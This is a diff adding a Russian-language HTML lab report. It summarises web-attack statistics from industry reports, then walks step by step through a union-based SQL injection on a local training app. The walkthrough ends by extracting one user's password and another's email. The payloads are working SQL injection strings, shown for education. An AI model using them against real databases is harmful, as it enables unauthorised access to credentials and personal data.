@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Отчет по лабораторной работе №1</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 40px auto;
+            max-width: 860px;
+            color: #333;
+        }
+        h1 {
+            color: #2c3e50;
+            border-bottom: 2px solid #2c3e50;
+            padding-bottom: 8px;
+        }
+        h2 {
+            color: #2c3e50;
+            margin-top: 30px;
+        }
+        p, li {
+            margin-bottom: 10px;
+        }
+        ul, ol {
+            margin-bottom: 15px;
+        }
+        a {
+            color: #2980b9;
+        }
+        table {
+            border-collapse: collapse;
+            width: 100%;
+            margin: 16px 0;
+        }
+        th, td {
+            border: 1px solid #ccc;
+            padding: 8px 12px;
+            text-align: left;
+        }
+        th {
+            background: #f0f0f0;
+        }
+        code {
+            background: #f4f4f4;
+            padding: 2px 5px;
+            border-radius: 3px;
+            font-family: monospace;
+            font-size: 0.95em;
+        }
+        pre {
+            background: #f4f4f4;
+            border-left: 3px solid #2c3e50;
+            padding: 12px 16px;
+            overflow-x: auto;
+            border-radius: 3px;
+            font-family: monospace;
+            font-size: 0.93em;
+            line-height: 1.5;
+        }
+        hr {
+            border: none;
+            border-top: 1px solid #ddd;
+            margin: 36px 0;
+        }
+        strong {
+            color: #111;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>ЧАСТЬ 1</h1>
+
+    <h2>1. Источники</h2>
+    <p>Всё, что ниже - из открытых аналитических отчётов за 2024–2025 гг.:</p>
+    <ol>
+        <li>
+            <strong>Positive Technologies</strong> - «Актуальные киберугрозы: I–II кварталы 2025 года» (мировая статистика) и «Актуальные киберугрозы для организаций в СНГ: H2 2024 - Q3 2025»
+            <ul>
+                <li><a href="https://ptsecurity.com/research/analytics/cis-cyberthreat-landscape-h2-2024-q3-2025/#id1">ptsecurity.com — СНГ: H2 2024 - Q3 2025</a></li>
+                <li><a href="https://ptsecurity.com/research/analytics/aktual-nye-kiberugrozy-i-ii-kvartaly-2025-goda/">ptsecurity.com — I–II кварталы 2025</a></li>
+            </ul>
+        </li>
+        <li>
+            <strong>Verizon</strong> - Data Breach Investigations Report (DBIR) 2025
+            <ul>
+                <li><a href="https://www.verizon.com/business/en-sg/resources/reports/dbir/">verizon.com — DBIR 2025</a></li>
+            </ul>
+        </li>
+    </ol>
+
+    <h2>2. Доля атак через веб-уязвимости</h2>
+    <p>По данным Positive Technologies (мир + СНГ), веб-ресурсы - основная цель примерно в <strong>27–28 %</strong> успешных атак на организации. Эксплуатация уязвимостей на внешнем периметре (а это в первую очередь веб-приложения) используется как начальный вектор проникновения в <strong>~31 %</strong> случаев.</p>
+
+    <p>По отраслям (scope) картина отличается:</p>
+    <table>
+        <tr><th>Отрасль</th><th>Доля атак через веб</th></tr>
+        <tr><td>Госучреждения</td><td>~21 %</td></tr>
+        <tr><td>Промышленность</td><td>~21 %</td></tr>
+        <tr><td>Финансовый сектор</td><td>~5 %</td></tr>
+    </table>
+
+    <p>У финансов цифра низкая из-за жёстких регуляторных требований к безопасности - банки просто обязаны чаще патчиться и проходить аудит.</p>
+
+    <p>Verizon DBIR показывает ещё один интересный момент: из всех успешных базовых атак на веб-приложения <strong>~88 %</strong> связаны не со сложной эксплуатацией багов, а с использованием украденных или подобранных учёток. То есть главная «уязвимость» - это пароли.</p>
+
+    <h2>3. Распределение по типам уязвимостей</h2>
+    <p>Классика вроде SQL-инъекций и RCE сильно сдала позиции - суммарно <strong>менее 5 %</strong>. Современные фреймворки неплохо защищают от этого «из коробки».</p>
+
+    <p>Сейчас топ выглядит так:</p>
+    <table>
+        <tr><th>Тип уязвимости</th><th>Доля</th></tr>
+        <tr><td>Broken Access Control (нарушение контроля доступа)</td><td>~30 %</td></tr>
+        <tr><td>XSS (межсайтовый скриптинг)</td><td>~28 %</td></tr>
+        <tr><td>DoS на уровне приложения</td><td>~22 %</td></tr>
+        <tr><td>Утечки данных через неправильное кэширование</td><td>~11 %</td></tr>
+    </table>
+
+    <p>Broken Access Control - это когда один пользователь может добраться до данных или функций другого из-за некорректной проверки прав. XSS держится на втором месте стабильно уже несколько лет.</p>
+
+    <hr>
+
+    <h1>ЧАСТЬ 2</h1>
+
+    <p>Для начала просто потыкался по адресам от <code>?id=0</code> до <code>?id=10</code>, чтобы понять что вообще есть в базе. Страница показывает только id и логин пользователя.</p>
+
+    <pre>http://localhost:8080/task/?id=1   -> admin
+http://localhost:8080/task/?id=2   -> Volk
+http://localhost:8080/task/?id=3   -> Matroskin
+http://localhost:8080/task/?id=4   -> Vinni-pukh
+http://localhost:8080/task/?id=5   -> Neznaika
+http://localhost:8080/task/?id=6   -> kotenok
+http://localhost:8080/task/?id=7   -> Karlson
+http://localhost:8080/task/?id=8   -> Kesha
+http://localhost:8080/task/?id=9   -> Volk2
+http://localhost:8080/task/?id=10  -> (пусто)</pre>
+
+    <p>Итого 9 пользователей. Нужные нам: <code>Vinni-pukh</code> - id=4, <code>Volk2</code> - id=9.</p>
+
+    <h2>Проверка на инъекцию</h2>
+    <p>Попробовал просто добавить одинарную кавычку в параметр, как написано в шпаргалке (<a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/">netsparker.com/blog/web-security/sql-injection-cheat-sheet/</a>):</p>
+
+    <pre>http://localhost:8080/task/?id=1'</pre>
+
+    <p>Страница вернула <code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1</code> - это значит что кавычка сломала запрос и докер образ не обрабатывает ошибку. Инъекция есть.</p>
+
+    <h2>Определение числа столбцов</h2>
+    <p>Чтобы использовать UNION, нужно знать сколько столбцов возвращает исходный запрос. Для этого из той же шпаргалки взял технику с <code>ORDER BY</code>:</p>
+
+    <pre>http://localhost:8080/task/?id=1' ORDER BY 1-- -
+http://localhost:8080/task/?id=1' ORDER BY 2-- -
+http://localhost:8080/task/?id=1' ORDER BY 3-- -</pre>
+
+    <p>Все три работают - страница показывает данные. Попробовал 4:</p>
+
+    <pre>http://localhost:8080/task/?id=1' ORDER BY 4-- -</pre>
+
+    <p>Пустой вывод - значит четвёртого столбца нет. Итого в таблице <strong>3 столбца</strong>.</p>
+
+    <h2>Получение пароля Volk2</h2>
+    <p>Страница выводит только <code>id</code> и <code>username</code>, пароль нигде не светится. Но раз есть UNION, можно подставить пароль на место одного из выводимых полей.</p>
+
+    <p>Сначала попробовал базовый вариант чтобы проверить что UNION вообще работает:</p>
+
+    <pre>http://localhost:8080/task/?id=0' UNION SELECT 1,2,3-- -</pre>
+
+    <p>Вернулось <code>id: 1, логин: 2</code> - отлично, второй столбец и есть <code>username</code> на экране. Значит туда и надо подставить пароль.</p>
+
+    <pre>http://localhost:8080/task/?id=0' UNION SELECT 1,password,3 FROM users WHERE username='Volk2'-- -</pre>
+
+    <p>Здесь <code>id=0</code> использую специально - такого пользователя нет, поэтому оригинальный запрос вернёт пустоту, а UNION вернёт только мою строку. Получил:</p>
+
+    <pre>Ваш id: 1
+Ваш логин: Wa spoiuuuuu</pre>
+
+    <p><strong>Пароль Volk2: <code>Wa spoiuuuuu</code></strong></p>
+
+    <h2>Получение email Vinni-pukh</h2>
+    <p>Тут сложнее - на странице отображается только таблица <code>users</code> (id и логин), email там не хранится. Нужно найти другую таблицу. Попробовал стандартные названия: <code>emails</code>, <code>email</code>, <code>contacts</code>.</p>
+
+    <pre>http://localhost:8080/task/?id=0' UNION SELECT 1,email_id,3 FROM emails WHERE id=4-- -</pre>
+
+    <p>Сработало с первой попытки - таблица называется <code>emails</code>, поле <code>email_id</code>. id=4 - это Vinni-pukh, мы его нашли ещё на этапе разведки.</p>
+
+    <pre>Ваш id: 1
+Ваш логин: honey_lover@otus-lab.com</pre>
+
+    <p><strong>Email Vinni-pukh: <code>honey_lover@otus-lab.com</code></strong></p>
+
+    <h2>Итог</h2>
+    <table>
+        <tr><th>Пользователь</th><th>Результат</th></tr>
+        <tr><td>Volk2</td><td>пароль: <code>Wa spoiuuuuu</code></td></tr>
+        <tr><td>Vinni-pukh</td><td>email: <code>honey_lover@otus-lab.com</code></td></tr>
+    </table>
+
+</body>
+</html>
